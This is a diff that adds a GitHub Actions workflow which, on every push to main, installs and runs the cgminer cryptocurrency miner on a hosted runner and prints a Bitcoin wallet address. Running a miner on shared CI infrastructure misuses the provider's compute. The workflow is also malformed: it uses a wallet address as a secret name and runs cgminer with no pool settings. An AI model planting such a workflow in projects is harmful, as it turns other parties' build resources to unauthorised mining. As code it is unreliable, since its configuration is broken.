@@ -1,0 +1,28 @@
+name: Run cgminer on Linux
+
+on:
+  push:
+    branches:
+      - main
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+    - name: Checkout code
+      uses: actions/checkout@v2
+      
+    - name: Install cgminer
+      run: |
+        sudo apt-get update
+        sudo apt-get install -y cgminer
+
+    - name: Run cgminer
+      run: cgminer
+
+    - name: Use Bitcoin wallet address
+      env:
+        BITCOIN_WALLET: ${{ secrets.bc1q9fz799u2gw5ycfkatz8w8npt3enht2f39md9jn }}
+      run: |
+        echo "My Bitcoin wallet address: $BITCOIN_WALLET"
